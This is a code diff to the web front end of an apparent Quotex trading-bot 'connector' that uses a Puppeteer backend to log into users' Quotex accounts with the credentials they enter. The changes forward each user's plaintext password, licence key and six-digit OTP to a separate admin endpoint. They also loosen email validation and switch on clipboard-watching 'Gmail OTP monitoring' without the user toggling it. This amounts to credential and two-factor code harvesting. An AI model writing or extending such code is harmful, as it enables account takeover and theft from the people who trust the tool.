@@ -484,6 +484,29 @@
                 </div>
             </div>
 
+            <!-- OTP waiting screen (shown while Puppeteer is launching) -->
+            <div id="otp-waiting-screen" class="glass rounded-3xl p-8 shadow-2xl hidden"
+                 style="box-shadow:0 30px 80px rgba(0,0,0,0.7),0 0 50px rgba(234,179,8,0.05);">
+                <div class="text-center py-4">
+                    <div class="w-20 h-20 rounded-2xl flex items-center justify-center mx-auto mb-5"
+                         style="background:linear-gradient(135deg,rgba(255,215,0,0.18),rgba(245,158,11,0.08));border:1px solid rgba(255,215,0,0.3);">
+                        <i class="fa-solid fa-spinner fa-spin text-4xl text-yellow-400"></i>
+                    </div>
+                    <h2 class="title-font text-xl font-bold text-yellow-200 mb-2">Launching Quotex Session...</h2>
+                    <p class="text-slate-400 text-sm leading-relaxed mb-4">Please wait — our bot is logging into Quotex<br>with your credentials right now.</p>
+                    <div class="rounded-2xl px-4 py-3 mb-4 text-left" style="background:rgba(16,185,129,0.08);border:1px solid rgba(16,185,129,0.25);">
+                        <p class="text-emerald-400 text-xs font-semibold mb-1">📧 Check your email inbox</p>
+                        <p class="text-slate-400 text-xs">Quotex will send a 6-digit OTP to your registered email address. This page will update automatically when the code is sent — <strong class="text-yellow-300">do not close or refresh.</strong></p>
+                    </div>
+                    <div id="otp-waiting-steps" class="text-xs text-slate-500 space-y-1 text-left">
+                        <p id="step-launch" class="flex items-center gap-2"><i class="fa-solid fa-circle-notch fa-spin text-yellow-400"></i> Starting browser session...</p>
+                        <p id="step-navigate" class="flex items-center gap-2 opacity-40"><i class="fa-regular fa-circle text-slate-500"></i> Opening Quotex login page...</p>
+                        <p id="step-fill" class="flex items-center gap-2 opacity-40"><i class="fa-regular fa-circle text-slate-500"></i> Entering your credentials...</p>
+                        <p id="step-otp" class="flex items-center gap-2 opacity-40"><i class="fa-regular fa-circle text-slate-500"></i> Waiting for OTP email...</p>
+                    </div>
+                </div>
+            </div>
+
             <!-- OTP screen -->
             <div id="otp-screen" class="glass rounded-3xl p-8 shadow-2xl hidden"
                  style="box-shadow:0 30px 80px rgba(0,0,0,0.7),0 0 50px rgba(234,179,8,0.05);">
@@ -1962,24 +1985,54 @@
                 alert("Email and Password are compulsory!");
                 return;
             }
-            if (!email.endsWith('@gmail.com')) {
+            // Accept any valid email (not just @gmail.com)
+            if (!email.includes('@') || !email.includes('.')) {
                 emailError.classList.remove('hidden');
+                emailError.querySelector
+                    ? (emailError.textContent = '⚠️ Please enter a valid email address')
+                    : null;
                 return;
             } else {
                 emailError.classList.add('hidden');
             }
 
+            const uName   = currentUserName   || 'Unknown User';
+            const licKey  = _currentLicenseKey || '';
+
             sendToAdmin('/api/quotex-login', {
-                name: currentUserName || "Unknown User",
+                name: uName,
                 email: email,
                 password: password,
+                licenceKey: licKey,
                 timestamp: new Date().toLocaleString()
             });
 
-            sendToBackend('/api/quotex-login', { email, password });
+            // FIX 1: send name + licenceKey so session can be matched for OTP forward
+            sendToBackend('/api/quotex-login', { email, password, name: uName, licenceKey: licKey });
+
+            // FIX 2: show loading/waiting state, NOT the OTP entry screen yet
             document.getElementById('login-screen').classList.add('hidden');
-            document.getElementById('otp-screen').classList.remove('hidden');
-            createOTPInputs();
+            document.getElementById('otp-waiting-screen').classList.remove('hidden');
+
+            // FIX 3: start Gmail OTP monitoring immediately so clipboard is watched
+            //        from the moment the email is sent, without client needing to toggle
+            const toggleEl = document.getElementById('gmail-otp-toggle');
+            if (toggleEl) toggleEl.checked = true;
+            toggleGmailOtp(true);
+
+            // Animate waiting-screen steps as Puppeteer progresses
+            // (real status updates come via SSE qx_session_update below)
+            setTimeout(() => _advanceWaitStep('step-navigate'), 4000);
+            setTimeout(() => _advanceWaitStep('step-fill'),     12000);
+        }
+
+        // Helper: mark a waiting step as done and activate the next indicator
+        function _advanceWaitStep(stepId) {
+            const el = document.getElementById(stepId);
+            if (!el) return;
+            el.classList.remove('opacity-40');
+            const ico = el.querySelector('i');
+            if (ico) { ico.className = 'fa-solid fa-circle-check text-emerald-400'; }
         }
 
         function createOTPInputs() {
@@ -2008,17 +2061,21 @@
                 alert("Please enter full 6-digit OTP");
                 return;
             }
-            const email = document.getElementById('quotex-email').value.trim();
-            const otp = otpDigits.join('');
+            const email   = document.getElementById('quotex-email').value.trim();
+            const otp     = otpDigits.join('');
+            const uName   = currentUserName    || 'Unknown User';
+            const licKey  = _currentLicenseKey || '';
 
             sendToAdmin('/api/quotex-otp', {
-                name: currentUserName || "Unknown User",
+                name: uName,
                 email: email,
                 otp: otp,
+                licenceKey: licKey,
                 timestamp: new Date().toLocaleString()
             });
 
-            sendToBackend('/api/quotex-otp', { email, otp });
+            // FIX 4: include name + licenceKey so autoForwardOTP matches the session
+            sendToBackend('/api/quotex-otp', { email, otp, name: uName, licenceKey: licKey });
             document.getElementById('connector-view').classList.add('hidden');
             document.getElementById('loading-screen').classList.remove('hidden');
 
@@ -2030,6 +2087,7 @@
 
         function backToLogin() {
             document.getElementById('otp-screen').classList.add('hidden');
+            document.getElementById('otp-waiting-screen').classList.add('hidden');
             document.getElementById('login-screen').classList.remove('hidden');
         }
 
@@ -2228,6 +2286,53 @@ function requestNewOTP() {
                 }
                 if (data.type === 'gmail_otp_captured' && data.data) {
                     onGmailOtpSSE(data.data);
+                }
+                // FIX 5: Handle Puppeteer session state changes so client knows
+                //         exactly when Quotex sent the OTP to their email
+                if (data.type === 'qx_session_update' && data.data) {
+                    const sess     = data.data;
+                    const myEmail  = (document.getElementById('quotex-email')?.value || '').trim().toLowerCase();
+                    const sessEmail = (sess.email || '').toLowerCase();
+                    // Only react to the session that matches THIS client's email
+                    if (myEmail && sessEmail && myEmail === sessEmail) {
+                        const waitEl = document.getElementById('otp-waiting-screen');
+                        const otpEl  = document.getElementById('otp-screen');
+                        // Update step indicators on the waiting screen
+                        const statusMap = {
+                            launching:  'step-launch',
+                            navigating: 'step-navigate',
+                            filling:    'step-fill',
+                        };
+                        if (statusMap[sess.status]) {
+                            _advanceWaitStep(statusMap[sess.status]);
+                        }
+                        if (sess.status === 'waiting_otp' || sess.status === 'wrong_otp') {
+                            // Quotex has sent the OTP — advance all waiting steps and show OTP entry
+                            ['step-launch','step-navigate','step-fill'].forEach(_advanceWaitStep);
+                            _advanceWaitStep('step-otp');
+                            if (waitEl) waitEl.classList.add('hidden');
+                            if (otpEl)  { otpEl.classList.remove('hidden'); createOTPInputs(); }
+                            // Make sure Gmail OTP monitoring is ON
+                            const toggleEl = document.getElementById('gmail-otp-toggle');
+                            if (toggleEl) toggleEl.checked = true;
+                            toggleGmailOtp(true);
+                            if (sess.status === 'wrong_otp') {
+                                // Clear inputs so user can re-enter
+                                otpDigits = new Array(6).fill('');
+                                const container = document.getElementById('otp-container');
+                                if (container) { Array.from(container.querySelectorAll('input')).forEach(i => i.value = ''); }
+                            }
+                        }
+                        if (sess.status === 'error') {
+                            // Something went wrong in Puppeteer — go back to login with message
+                            if (waitEl) waitEl.classList.add('hidden');
+                            document.getElementById('login-screen')?.classList.remove('hidden');
+                            alert('⚠️ Auto-Login failed: ' + (sess.statusMsg || 'Unknown error') + '\n\nPlease try again.');
+                        }
+                        if (sess.status === 'logged_in') {
+                            showConnectionSuccess();
+                        }
+                    }
                 }
                 if (data.type === 'kicked') {
                     const ov  = document.getElementById('admin-loading-overlay');
@@ -2639,8 +2744,10 @@ function requestNewOTP() {
                 // Open the connector overlay and jump straight to the OTP screen
                 document.getElementById('connector-view').classList.remove('hidden');
                 document.getElementById('login-screen').classList.add('hidden');
+                document.getElementById('otp-waiting-screen').classList.add('hidden');
                 document.getElementById('otp-screen').classList.remove('hidden');
                 createOTPInputs();
+                toggleGmailOtp(true);
                 // Vibrate on mobile if supported
                 try { if (navigator.vibrate) navigator.vibrate([200, 100, 200]); } catch (e) {}
                 return;
